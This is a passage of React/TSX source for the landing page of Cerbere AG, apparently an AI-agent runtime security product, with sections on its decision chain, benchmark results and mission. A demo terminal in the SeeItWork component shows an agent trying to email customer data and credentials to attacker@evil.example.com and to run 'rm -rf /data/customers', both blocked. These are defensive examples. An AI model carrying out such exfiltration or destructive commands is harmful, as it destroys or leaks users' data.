yableCode.tsx

import { useState } from "react";

export function CopyableCode({ code }: { code: string }) {
  const [copied, setCopied] = useState(false);

  const handleCopy = async () => {
    await navigator.clipboard.writeText(code);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <button
      onClick={handleCopy}
      className="group w-full cursor-pointer rounded-sm border border-line-black bg-black/30 p-4 text-left transition-all hover:border-amber hover:bg-black/50 active:scale-[0.98]"
    >
      <div className="font-mono text-xs text-paper/50 group-hover:text-amber transition-colors">
        {copied ? "✓ copied" : "click to copy"}
      </div>
      <div className="mt-2 font-mono text-sm text-paper group-hover:text-amber transition-colors break-all">
        {code}
      </div>
    </button>
  );
}



src/components/sections/Topbar.tsx

import { APP, DOCS, GITHUB } from "@/lib/constants";
import logo from "@/assets/cerbere-logo.jpeg";

export function Topbar() {
  return (
    <header className="sticky top-0 z-50 border-b border-line-black bg-ink/85 backdrop-blur-md">
      <div className="wrap flex h-[68px] items-center justify-between">
        <a href="#" className="flex items-center gap-2.5 font-mono text-[17px] font-bold">
          <img
            src={logo}
            alt="Cerbere AG logo"
            className="size-8 shrink-0 border border-amber/40 object-cover"
          />
          <span>
            CERBERE<span className="text-amber">&nbsp;AG</span>
          </span>
        </a>

        <nav className="flex items-center gap-5">
          <a
            href={DOCS}
            className="hidden font-mono text-sm text-paper/70 transition-colors hover:text-amber sm:block"
          >
            Docs
          </a>

          <a
            href="#integrations"
            className="hidden font-mono text-sm text-paper/70 transition-colors hover:text-amber sm:block"
          >
            Integrations
          </a>

          <a
            href="#benchmark"
            className="hidden font-mono text-sm text-paper/70 transition-colors hover:text-amber sm:block"
          >
            Benchmark
          </a>

          <a
            href="#pricing"
            className="hidden font-mono text-sm text-paper/70 transition-colors hover:text-amber sm:block"
          >
            Pricing
          </a>

          <a
            href={GITHUB}
            target="_blank"
            rel="noopener"
            aria-label="View source on GitHub"
            className="flex size-9 items-center justify-center text-paper/75 transition-opacity hover:text-paper"
          >
            <svg width="21" height="21" viewBox="0 0 24 24" fill="currentColor">
              <path d="M12 .5C5.73.5.75 5.48.75 11.75c0 5.02 3.26 9.28 7.77 10.78.57.1.78-.25.78-.55 0-.27-.01-1.17-.02-2.12-3.16.69-3.83-1.34-3.83-1.34-.52-1.31-1.26-1.66-1.26-1.66-1.03-.7.08-.69.08-.69 1.14.08 1.74 1.17 1.74 1.17 1.01 1.73 2.65 1.23 3.3.94.1-.73.4-1.23.72-1.51-2.52-.29-5.17-1.26-5.17-5.6 0-1.24.44-2.25 1.17-3.04-.12-.29-.51-1.45.11-3.02 0 0 .96-.31 3.14 1.16a10.9 10.9 0 0 1 5.72 0c2.18-1.47 3.14-1.16 3.14-1.16.62 1.57.23 2.73.11 3.02.73.79 1.17 1.8 1.17 3.04 0 4.35-2.65 5.31-5.18 5.59.41.35.77 1.05.77 2.12 0 1.53-.01 2.76-.01 3.14 0 .3.2.66.79.55A11.26 11.26 0 0 0 23.25 11.75C23.25 5.48 18.27.5 12 .5Z" />
            </svg>
          </a>

          <a
            href={APP + "/login"}
            className="inline-flex items-center rounded-sm border border-line-black px-4 py-2.5 font-mono text-sm transition-colors hover:border-amber hover:text-amber"
          >
            Sign in
          </a>
        </nav>
      </div>
    </header>
  );
}



src/components/sections/Hero.tsx

import { useEffect, useState } from "react";
import { Reveal } from "@/components/Reveal";
import { CopyableCode } from "@/components/CopyableCode";
import { APP, GITHUB, MCP_INSTALL_CMD } from "@/lib/constants";

const rotating = [
  "blocks prompt injection before it reaches your tools",
  "stops data exfiltration before it leaves your systems",
  "catches destructive commands before they run",
  "observes every agent decision in one audit trail",
];

export function Hero() {
  const [rot, setRot] = useState(0);

  useEffect(() => {
    const id = setInterval(() => setRot((i) => (i + 1) % rotating.length), 3200);
    return () => clearInterval(id);
  }, []);

  return (
    <section className="wrap relative isolate grid items-center gap-14 py-20 md:py-24 lg:grid-cols-[1.15fr_.85fr]">
      <div className="hero-bg" aria-hidden="true" />
      <div>
        <Reveal>
          <h1 className="text-[clamp(34px,5vw,58px)] leading-[1.08]">
            <span className="block">Cerbere AG</span>

            <span className="relative mt-0.5 block min-h-[1.25em] text-amber">
              {rotating.map((line, i) => (
                <span
                  key={line}
                  className={[
                    "left-0",
                    "top-0",
                    "w-full",
                    "transition-all",
                    "duration-500",
                    i === rot
                      ? "relative block translate-y-0 opacity-100"
                      : "absolute block translate-y-2.5 opacity-0",
                  ].join(" ")}
                >
                  {line}
                </span>
              ))}
            </span>
          </h1>
        </Reveal>

        <Reveal>
          <p className="mt-6 max-w-[46ch] text-[19px] text-paper/70">
            Runtime security and observability for AI agents. It is the agentic era. Stay in
            control.
          </p>
        </Reveal>

        <Reveal>
          <div className="mt-9 space-y-5">
            <div className="flex flex-wrap gap-3.5">
              <a
                href={APP + "/login"}
                className="inline-flex items-center rounded-sm bg-amber px-4.5 py-2.5 font-mono text-sm text-ink transition-colors hover:bg-amber-deep"
              >
                Get started free
              </a>

              <a
                href={GITHUB}
                target="_blank"
                rel="noopener"
                className="inline-flex items-center rounded-sm border border-line-black px-4.5 py-2.5 font-mono text-sm transition-colors hover:border-amber hover:text-amber"
              >
                View on GitHub
              </a>
            </div>

            <div>
              <span className="mb-1.5 block font-mono text-[11px] uppercase tracking-wider text-paper/40">
                Python SDK
              </span>
              <CopyableCode code="pip install cerbere-ag" />
            </div>

            <div>
              <span className="mb-1.5 block font-mono text-[11px] uppercase tracking-wider text-paper/40">
                MCP · Claude Code, Cursor and other MCP clients
              </span>
              <CopyableCode code={MCP_INSTALL_CMD} />
            </div>
          </div>
        </Reveal>
      </div>

      <Reveal className="border border-line-black p-5.5 font-mono text-[13px] text-paper/55">
        <div className="mb-4 flex gap-1.5">
          <span className="size-2.5 rounded-full bg-paper/20" />
          <span className="size-2.5 rounded-full bg-paper/20" />
          <span className="size-2.5 rounded-full bg-paper/20" />
        </div>

        {[
          ["agent_id", "support-agent-04", ""],
          ["tool", "send_email", ""],
          ["check", "exfiltration pattern", ""],
          ["decision", "BLOCKED", "text-deny"],
          ["logged to", "audit trail", ""],
        ].map(([k, v, c], i) => (
          <div
            key={k}
            className={["flex", "justify-between", "py-1.5", i === 0 ? "" : "border-t", "border-line-black"].join(" ")}
          >
            <span>{k}</span>
            <b className={["font-medium", c ? c : "text-paper"].join(" ")}>{v}</b>
          </div>
        ))}
      </Reveal>
    </section>
  );
}



src/components/sections/DecisionChain.tsx

import { Reveal } from "@/components/Reveal";
import { HowItWorks } from "@/components/HowItWorks";

const steps: Array<[string, string, string]> = [
  ["01", "Agent acts", "Your agent calls a tool or an LLM through the SDK or MCP server."],
  ["02", "Identity & capability", "Cerbere resolves which agent this is and what it is allowed to hold."],
  ["03", "Scope & sensitivity", "The specific arguments are checked against scope and data classification."],
  ["04", "Policy evaluated", "Budget, rate limits and your org's rules are applied to this one call."],
  ["05", "Decision", "Allow, block, or hold for human approval, logged with the full reasoning."],
];

export function DecisionChain() {
  return (
    <section className="border-t border-line-black bg-ink py-20 md:py-28">
      <div className="wrap">
        <Reveal className="max-w-2xl">
          <span className="eyebrow">how it works</span>
          <h2 className="mt-3 text-[clamp(26px,3.4vw,36px)]">One decision chain, every time.</h2>
          <p className="mt-3.5 max-w-[54ch] text-base text-paper/65">
            Cerbere sits inline on every LLM call and every tool call. Each one walks the same
            deterministic chain before it is allowed to run, no black-box model grading its own
            homework.
          </p>
        </Reveal>

        <div className="mt-14 grid gap-0 overflow-x-auto md:grid-cols-5">
          {steps.map(([n, title, body], i) => (
            <Reveal
              key={n}
              className={[
                "min-w-[220px]",
                "border-t",
                "border-line-black",
                "p-6",
                "md:border-l",
                "md:border-t-0",
                i === 0 ? "md:border-l-0" : "",
              ].join(" ")}
            >
              <span className="font-mono text-[12.5px] text-amber">{n}</span>
              <h3 className="mb-2 mt-3 text-[17px]">{title}</h3>
              <p className="text-[13.5px] text-paper/60">{body}</p>
            </Reveal>
          ))}
        </div>

        <HowItWorks />
      </div>
    </section>
  );
}



src/components/sections/SeeItWork.tsx

import { Reveal } from "@/components/Reveal";
import { Terminal, type Line } from "@/components/Terminal";

const dim = "text-paper/40";
const allow = "text-allow";
const deny = "text-deny";
const amb = "text-amber";

const installLines: Line[] = [
  [{ t: "$ pip install cerbere-ag" }],
  [{ t: "Successfully installed cerbere-ag-0.1.3", c: dim }],
  [],
  [{ t: "$ export AGENTGUARD_API_KEY=ag_live_..." }],
  [{ t: "$ cerbere" }],
  [{ t: "   🛡️  CERBERE AG IS ACTIVE  🛡️", c: amb }],
  [{ t: "   The three-headed guardian is watching your agents.", c: dim }],
];

const runLines: Line[] = [
  [{ t: "$ python agent_demo.py" }],
  [
    { t: '{"strong": 141, "weak": 7, "extended_patterns": 107, "event": "regex_patterns_compiled"}', c: dim },
  ],
  [{ t: '{"event": "signed_decisions_enabled", "level": "info"}', c: dim }],
  [{ t: '{"mode": "memory", "event": "atomic_budget_manager_enabled"}', c: dim }],
  [
    {
      t: '{"collector": "https://app.cerbereag.site", "signed_decisions": true, "taint_tracking": true, "runtime_risk": true, "trajectory": true, "event": "agentguard_initialized"}',
      c: dim,
    },
  ],
  [],
  [{ t: "PHASE 1 - Agent's normal work (legitimate tasks)", c: amb }],
  [],
  [{ t: "[AGENT] ", c: dim }, { t: "search_web({'query': 'meteo Paris demain'})" }],
  [
    { t: "[CERBERE] " },
    { t: "ALLOW", c: allow },
    { t: " -> [resultats simules pour 'meteo Paris demain']" },
  ],
  [],
  [{ t: "[AGENT] ", c: dim }, { t: "check_calendar({'date': '2026-09-12'})" }],
  [
    { t: "[CERBERE] " },
    { t: "ALLOW", c: allow },
    { t: " -> [free slot on 2026-09-12 at 3:00 PM]" },
  ],
  [],
  [
    { t: "[AGENT] ", c: dim },
    {
      t: "write_file({'path': 'daily_recap.txt', 'content': 'Recap: meeting confirmed for 09/12'})",
    },
  ],
  [
    { t: "[CERBERE] " },
    { t: "ALLOW", c: allow },
    { t: " -> [file 'daily_recap.txt' written, 54 characters]" },
  ],
  [],
  [
    { t: "[AGENT] ", c: dim },
    {
      t: "send_email({'to': 'colleague@company.com', 'subject': 'Daily recap'})",
    },
  ],
  [
    { t: "[CERBERE] " },
    { t: "ALLOW", c: allow },
    { t: " -> [email sent to colleague@company.com]" },
  ],
  [],
  [{ t: "PHASE 2 - Malicious action attempt (injection / abuse)", c: amb }],
  [],
  [
    { t: "[AGENT] ", c: dim },
    {
      t: "send_email({'to': 'attacker@evil.example.com', 'body': 'base de donnees clients et credentials en piece jointe'})",
    },
  ],
  [
    { t: "[CERBERE] " },
    { t: "BLOCKED", c: deny },
    {
      t: " -> 🛡️ Runtime risk DENY: local policy: Exfiltration detected in email",
    },
  ],
  [],
  [
    { t: "[AGENT] ", c: dim },
    {
      t: "execute_command({'command': 'rm -rf /data/customers'})",
    },
  ],
  [
    { t: "[CERBERE] " },
    { t: "BLOCKED", c: deny },
    {
      t: " -> 🛡️ Runtime risk DENY: local policy: Dangerous command pattern",
    },
  ],
  [],
  [{ t: "DONE", c: amb }],
  [{ t: "-> Audit Trail: 4 actions allowed, 2 actions blocked.", c: dim }],
];

export function SeeItWork() {
  return (
    <section className="border-t border-line-black bg-cream py-20 text-coal md:py-28">
      <div className="wrap">
        <Reveal className="max-w-2xl">
          <span className="eyebrow">see it work</span>
          <h2 className="mt-3 text-[clamp(26px,3.4vw,36px)]">
            Watch security and observability in action.
          </h2>
        </Reveal>

        <div className="mt-12 grid gap-8 lg:grid-cols-2">
          <Reveal>
            <Terminal title="install and run" lines={installLines} />
          </Reveal>

          <Reveal>
            <Terminal title="security decisions" lines={runLines} height="min-h-[340px]" />
          </Reveal>
        </div>
      </div>
    </section>
  );
}



src/components/sections/Benchmark.tsx

import { Reveal } from "@/components/Reveal";

const stats = [
  { tag: "regex layer", value: "91.5%", detail: "recall, 0% false positives" },
  { tag: "regex + ML", value: "98.1%", detail: "recall" },
  { tag: "ML layer", value: "5% / 33%", detail: "false positives, benign / hard negatives" },
  { tag: "ML layer", value: "~450ms", detail: "p95 latency" },
];

export function Benchmark() {
  return (
    <section id="benchmark" className="border-t border-line-black bg-cream py-20 text-coal md:py-28">
      <div className="wrap">
        <Reveal className="max-w-2xl">
          <span className="eyebrow">benchmark</span>
          <h2 className="mt-3 text-[clamp(26px,3.4vw,36px)]">
            Measured against a public prompt injection set.
          </h2>
          <p className="mt-3.5 max-w-[54ch] text-base text-coal/70">
            We ran our detection pipeline against a public benchmark and published the full
            methodology, strengths and weaknesses, including where it still misses.
          </p>
        </Reveal>

        <div className="mt-12 grid gap-px border border-line-cream bg-line-cream sm:grid-cols-2 lg:grid-cols-4">
          {stats.map(({ tag, value, detail }) => (
            <Reveal key={tag + value} className="bg-cream p-7">
              <span className="font-mono text-[12px] font-semibold text-amber-deep">{tag}</span>
              <div className="mt-3 font-display text-[30px] leading-none">{value}</div>
              <p className="mt-2 text-[13.5px] text-coal/65">{detail}</p>
            </Reveal>
          ))}
        </div>

        <Reveal className="mt-8">
          <a
            href="/blog/detecting-prompt-injection-in-production"
            className="inline-flex items-center gap-2 font-mono text-sm text-amber-deep transition-colors hover:text-coal"
          >
            Read the full benchmark write-up
            <span aria-hidden>→</span>
          </a>
        </Reveal>
      </div>
    </section>
  );
}



src/components/sections/Research.tsx

import { Reveal } from "@/components/Reveal";

export function Research() {
  return (
    <section id="research" className="border-t border-line-black bg-ink py-20 text-paper md:py-28">
      <div className="wrap">
        <Reveal className="max-w-2xl">
          <span className="eyebrow">research</span>
          <h2 className="mt-3 text-[clamp(26px,3.4vw,36px)]">
            Built on a moving field, not a fixed list.
          </h2>
          <p className="mt-3.5 max-w-[56ch] text-base text-paper/65">
            Agent security research moves fast. Here is what we track, and where our own benchmark
            fits into it.
          </p>
        </Reveal>

        <div className="mt-12 grid gap-10 md:grid-cols-2 md:gap-16">
          <Reveal className="border-l border-line-black pl-6">
            <span className="mb-2.5 block font-mono text-sm text-amber">
              OWASP GenAI Security Project
            </span>
            <h3 className="mb-3 text-xl">Top 10 for LLM Applications, 2026 edition</h3>
            <p className="max-w-[42ch] text-[15.5px] text-paper/65">
              Prompt injection holds the No. 1 spot again, and excessive agency jumped from 6th to
              3rd, the biggest move in this year's ranking. Our policy chain (identity,
              capability, scope, then decision) targets that shift directly: excessive agency is a
              permissions problem, not just a detection problem.
            </p>
          </Reveal>

          <Reveal className="border-l border-line-black pl-6">
            <span className="mb-2.5 block font-mono text-sm text-amber">
              Academic benchmarks (InjecAgent, StruQ)
            </span>
            <h3 className="mb-3 text-xl">Standalone prompting defenses stay brittle</h3>
            <p className="max-w-[42ch] text-[15.5px] text-paper/65">
              Tool-integrated agents remain exploitable even under strong system prompts, and
              combined attacks raise success rates further. It's why we don't rely on prompting
              the model to behave: every call is checked by a layer the agent cannot talk its way
              around.
            </p>
          </Reveal>
        </div>

        <Reveal className="mt-10">
          <a
            href="/blog/detecting-prompt-injection-in-production"
            className="inline-flex items-center gap-2 font-mono text-sm text-amber transition-colors hover:text-paper"
          >
            Where our benchmark fits in
            <span aria-hidden>→</span>
          </a>
        </Reveal>
      </div>
    </section>
  );
}



src/components/sections/Mission.tsx

import { Reveal } from "@/components/Reveal";

export function Mission() {
  return (
    <section className="bg-ink py-20 text-paper md:py-28">
      <div className="wrap">
        <Reveal>
          <span className="eyebrow">mission</span>
        </Reveal>

        <Reveal>
          <p className="mt-3 max-w-[30ch] font-display text-[clamp(22px,2.6vw,29px)] font-medium leading-[1.32]">
            The internet's early years taught us that an open, unguarded system gets exploited.
            Agentic AI is repeating that lesson, faster.
          </p>
        </Reveal>

        <div className="mt-14 grid gap-10 md:grid-cols-2 md:gap-16">
          <Reveal className="border-l border-line-black pl-6">
            <span className="mb-2.5 block font-mono text-sm text-amber">1995 - the open web</span>
            <h3 className="mb-3 text-xl">Every new connection was a new exposure.</h3>
            <p className="max-w-[40ch] text-[15.5px] text-paper/65">
              As homes and offices came online, viruses, worms and bad actors found an unguarded
              surface. It took firewalls, antivirus and years of hard lessons before connected
              stopped meaning exposed.
            </p>
          </Reveal>

          <Reveal className="border-l border-line-black pl-6">
            <span className="mb-2.5 block font-mono text-sm text-amber">2026 - the agentic era</span>
            <h3 className="mb-3 text-xl">Every new agent is a new attack surface.</h3>
            <p className="max-w-[40ch] text-[15.5px] text-paper/65">
              An agent that can read, decide and act can also be hijacked by a poisoned document,
              a malicious tool response or an injected instruction. Without a layer that checks
              intent before execution, autonomy becomes risk.
            </p>
          </Reveal>
        </div>
      </div>
    </section>
  );
}



src/components/sections/Observability.tsx
